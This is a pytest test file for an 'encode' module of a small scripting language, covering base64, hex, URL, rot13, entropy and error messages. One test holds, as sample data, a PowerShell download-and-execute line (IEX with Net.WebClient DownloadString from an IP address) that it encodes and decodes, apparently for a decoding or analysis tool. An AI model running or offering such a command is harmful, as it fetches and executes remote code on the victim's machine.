import base64

import pytest

from conftest import run_tb, tb_error


def test_base64_round_trip_and_unicode():
    src = 'import encode\nsay(encode.base64("hello"))\nsay(encode.unbase64("aGVsbG8="))\nsay(encode.unbase64(encode.base64("café ♥")))'
    assert run_tb(src) == ["aGVsbG8=", "hello", "café ♥"]


def test_unbase64_is_forgiving():
    # missing padding, spaces/newlines, and URL-safe characters
    raw = bytes([251, 255, 191]) + b"ok"
    urlsafe = base64.urlsafe_b64encode(raw).decode().rstrip("=")
    src = f'import encode\nsay(encode.unbase64("aGVs bG8"))\nsay(encode.unbase64("aGVsbG8\\n"))\nsay(len(encode.unbase64("{urlsafe}", "latin-1")))'
    assert run_tb(src) == ["hello", "hello", "5"]


def test_unbase64_decodes_powershell_encoded_command():
    payload = "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.200/a.ps1')"
    encoded = base64.b64encode(payload.encode("utf-16-le")).decode()
    src = f'import encode\nsay(encode.unbase64("{encoded}"))\nsay(encode.base64("hi", "utf-16"))'
    assert run_tb(src) == [payload, "aABpAA=="]


def test_hex_url_rot13():
    src = r'''import encode
say(encode.hex("hi"), encode.unhex("6869"), encode.unhex("68 69"), encode.unhex("\x68\x69"), encode.unhex("0x68:0x69"))
say(encode.url("a b&c=d/é"), encode.unurl("a%20b%26c+d"), encode.unurl(encode.unurl("%252e%252e%252f")))
say(encode.rot13("Hello, World"), encode.rot13(encode.rot13("Tanisha")))'''
    assert run_tb(src) == ["6869 hi hi hi hi", "a%20b%26c%3Dd%2F%C3%A9 a b&c d ../", "Uryyb, Jbeyq Tanisha"]


def test_entropy():
    src = 'import encode\nsay(encode.entropy(""), encode.entropy("aaaa"), encode.entropy("ab"), encode.entropy("abcd"))\nsay(encode.entropy("x7kq9zv2mw8rj4tl.example") > encode.entropy("mail.example"))'
    assert run_tb(src) == ["0 0 1 2", "true"]


@pytest.mark.parametrize("src,message", [
    ('encode.unbase64("not base64!")', "isn't base64"),
    ('encode.unbase64("abcde")', "wrong length"),
    ('encode.unhex("6g")', "isn't hex"),
    ('encode.unhex("686")', "isn't hex"),
    ('encode.base64("x", "klingon")', "doesn't know the encoding \"klingon\""),
    ("encode.rot13(3)", "encode.rot13() needs text to be text, not a number."),
])
def test_encode_errors(src, message):
    assert message in str(tb_error(f"import encode\n{src}"))
